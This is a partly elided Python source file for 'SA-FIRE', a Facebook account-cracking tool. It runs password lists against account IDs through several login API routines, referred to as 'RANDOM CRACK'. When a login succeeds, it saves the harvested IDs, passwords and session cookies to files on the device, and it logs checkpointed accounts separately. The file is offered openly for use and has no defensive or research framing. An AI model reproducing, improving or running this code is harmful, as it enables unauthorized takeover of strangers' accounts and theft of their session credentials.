#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FULL SCRIPT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
# OWNER BY SCRIPT : MR NUMAN
# GITHUB LINK : DARK-HOST
# MACK BY : ROBIN AHMED 
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
print("\x1b[38;5;46m➤\x1b[1;97m WELCOME SA-FIRE🌺🌺 TOOL")
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;✘ SA-FIRE🌺🌺 ✘ XD ✘\x07')
...
bxd = ""
kex = bxd+id
myweb2 = requests.get("https://github.com/DavilBoys19/Aprooval.txt/blob/main/Approval.txt").text
def apv():
	try:
		clear()
		x = requests.get('https://github.com/DavilBoys19/Aprooval.txt/blob/main/Approval.txt').text
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#	
logo=f"""{A}
{A}          💔🥀 IT'S NOT A NAME IT'S EMOTION BOTHER 🥀💔
   ...
   \x1b[38;5;46m➤ 2.0
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m➤{A} FACEBOOK     {R}:{A} ROBIN BIN NUMAN
\x1b[38;5;46m➤{A} GITHUB       {R}:{A} DAVIL BOYS (D.H)
\x1b[38;5;46m➤{A} FEATURE      {R}:{A} FILE{G}✘{A}RANDOM
\x1b[38;5;46m➤{A} QUALITY      {R}:{G} FREE
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ USERNAME ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
...
def Main():
        try:
                        ...
                        print(f'\x1b[38;5;46m➤{A} 1 RANDOM CRACK\n\x1b[38;5;46m➤{A} 2 JOINT PUBLIC GROUP \n\x1b[38;5;46m➤{A} 3 CONTACT OWNER \n\x1b[38;5;46m➤{A} 4{R} EXIT TERMINAL')
                        linex()
                        ...
                        if oggy in ['922','01']:
                                ...
                                os.system('xdg-open https://facebook.com/groups/shark.bite.spamming.cyber.squad//');menu()
                        elif numan in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/JIBONER.REAL.PAPPA.ITZ.ME.BBZ');menu()
                        elif numan in ['0','00']:
...
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}SA-FIRE🌺🌺-M1{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\x1b[38;5;46m➤ {A}[{G}SA-FIRE🌺🌺-OK{A}]{G} '+ids+f' | '+pas+'')
                open('/sdcard/SA-FIRE🌺🌺-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/SA-FIRE🌺🌺-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}SA-FIRE🌺🌺-M2{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                open('/sdcard/SA-FIRE🌺🌺-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/SA-FIRE🌺🌺-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}SA-FIRE🌺🌺-M3{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m➤ {A}[{G}SA-FIRE🌺🌺-OK{A}]{G} '+ids+f'|'+pas+'')
                open('/sdcard/SA-FIRE🌺🌺-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/SA-FIRE🌺🌺-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def __API__(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}SA-FIRE🌺🌺-FORCE{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    if "Y" in ck:
                        ...
                        open('/sdcard/SA-FIRE🌺🌺-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/SA-FIRE🌺🌺-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\rx1b[38;5;46m➤ {A}[{G}SA-FIRE🌺🌺-OK{A}]{G} {cid} | {pas} ')
